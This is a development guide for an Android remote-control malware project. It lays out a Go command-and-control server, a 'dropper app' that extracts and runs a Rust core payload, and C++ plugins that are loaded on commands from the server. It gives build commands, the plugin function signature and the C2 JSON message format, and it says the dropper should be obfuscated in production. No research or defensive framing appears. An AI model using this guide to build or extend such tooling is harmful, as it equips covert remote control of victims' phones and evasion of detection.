# Development Guide

## Environment Setup

### C2 Server (Go)
- Install Go 1.16+
- Set up PostgreSQL
- Install required Go packages:
  ```
  go get -u github.com/gin-gonic/gin
  go get -u github.com/gorilla/websocket
  go get -u gorm.io/gorm
  go get -u gorm.io/driver/postgres
  ```

### Dropper App (Android - Kotlin/Java)
- Install Android Studio 4.0+
- Install Android SDK 21+
- Set up Gradle 7.0+
- Configure NDK for native development

### Core Payload (Rust)
- Install Rust 1.50+
- Set up cargo-ndk:
  ```
  cargo install cargo-ndk
  ```
- Configure Android targets:
  ```
  rustup target add aarch64-linux-android armv7-linux-androideabi i686-linux-android x86_64-linux-android
  ```
- Install required dependencies:
  ```
  cargo add tokio tokio-tungstenite futures-util url serde serde_json libloading libc
  ```

### Plugins (C++ with NDK)
- Install CMake 3.10+
- Configure Android NDK
- Set up cross-compilation environment

## Development Workflow

### Adding a New Feature
1. Create a feature branch
2. Implement the feature
3. Write tests
4. Submit a pull request

### Adding a New Plugin
1. Create a new directory under `plugins/src/`
2. Implement the plugin interface
3. Add the plugin to the CMake build system
4. Create JNI and Rust bindings

### Core Payload Development
1. The core payload is implemented in Rust and communicates with the C2 server via WebSockets
2. The payload dynamically loads plugins based on commands received from the C2 server
3. Plugin naming convention: `lib<action_name>.so` (lowercase, no underscores)
4. Each plugin must export a C function with the signature:
   ```c
   char* execute_action(const char* payload);
   ```
5. To compile the core payload for Android:
   ```
   cd core_payload
   cargo ndk -t armeabi-v7a -t arm64-v8a build --release
   ```

### Dropper App Development
1. The Android dropper app extracts and executes the core payload
2. The app requires the INTERNET permission and should be obfuscated in production
3. To build the dropper app:
   ```
   cd dropper_app
   ./gradlew clean build
   ```

## Communication Protocol

### C2 to Core Payload
```json
{
  "action": "PLUGIN_NAME",
  "payload": "json_encoded_parameters"
}
```

### Plugin Result Format
Plugins should return results as JSON-encoded strings that will be forwarded to the C2 server.